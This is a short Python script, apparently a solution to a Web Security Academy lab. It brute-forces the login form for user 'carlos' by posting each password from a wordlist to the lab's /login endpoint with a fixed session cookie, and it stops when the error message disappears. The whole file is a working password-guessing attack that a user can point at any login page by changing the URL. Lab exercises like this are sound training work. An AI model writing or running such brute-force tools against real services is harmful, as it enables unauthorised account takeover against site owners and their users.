import requests

def read_wordlist(file_path):
    with open(file_path, "r") as file:
        return [line.strip() for line in file]

wordlist_path = input("Enter wordlist path: ")
wordlist = read_wordlist(wordlist_path)

def brute_force():
    headers = {
        "cookie": "session=kH110M1Mf8Dcfc44BX2IUlvwvOq3gkim"
    }
    for password in wordlist:
        print(f"Trying {password}")
        data = {
            "username": "carlos",
            "password": f"{password}"
        }
        r = requests.post("http://0a87000f0465bef38278bfd700180018.web-security-academy.net/login", data=data, headers=headers)
        if "Invalid username or password." not in r.text:
            print(f"Successful login with password: {password}")
            break

brute_force()
